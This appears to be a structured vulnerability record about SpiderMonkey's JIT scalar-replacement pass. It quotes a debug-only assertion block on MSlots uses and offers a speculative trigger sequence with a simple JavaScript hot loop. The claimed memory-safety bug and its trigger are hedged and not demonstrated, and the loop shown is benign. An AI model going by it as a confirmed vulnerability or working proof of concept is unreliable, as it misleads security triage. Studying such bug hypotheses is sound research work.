vulnerability.source_evidence:
// ScalarReplacement.cpp lines 287-304:
      case MDefinition::Opcode::Slots: {
#ifdef DEBUG
        // Assert that MSlots are only used by MStoreDynamicSlot and
        // MLoadDynamicSlot.
        MSlots* ins = def->toSlots();
        MOZ_ASSERT(ins->object() != 0);
        for (MUseIterator i(ins->usesBegin()); i != ins->usesEnd(); i++) {
          // toDefinition should normally never fail, since they don't get
          // captured by resume points.
          MDefinition* def = (*i)->consumer()->toDefinition();
          MOZ_ASSERT(
              def->op() == MDefinition::Opcode::StoreDynamicSlot ||
              def->op() == MDefinition::Opcode::LoadDynamicSlot ||
              def->op() == MDefinition::Opcode::StoreDynamicSlotFromOffset ||
              def->op() == MDefinition::Opcode::LoadDynamicSlotFromOffset);
        }
#endif
        break;
      }

trigger.sequence:
1. Create an object with enough properties to require dynamic slots (more than the inline slot count, typically > 16 properties)
2. Manipulate the object such that the MSlots node gets an unexpected consumer through optimization passes (e.g., via GVN or instruction reordering creating a use of MSlots by something other than StoreDynamicSlot/LoadDynamicSlot)
3. In release builds, the debug-only assertion is skipped, so the object is considered non-escaped
4. Scalar replacement eliminates the object, but the unexpected MSlots consumer operates on invalid memory

```javascript
function trigger() {
  // Create object with dynamic slots
  let obj = {a:1, b:2, c:3, d:4, e:5, f:6, g:7, h:8, 
             i:9, j:10, k:11, l:12, m:13, n:14, o:15, p:16, q:17};
  // Access dynamic slots in ways that might create unexpected MSlots uses
  let sum = obj.q + obj.p;
  return sum;
}
for (let i = 0; i < 100000; i++) trigger();
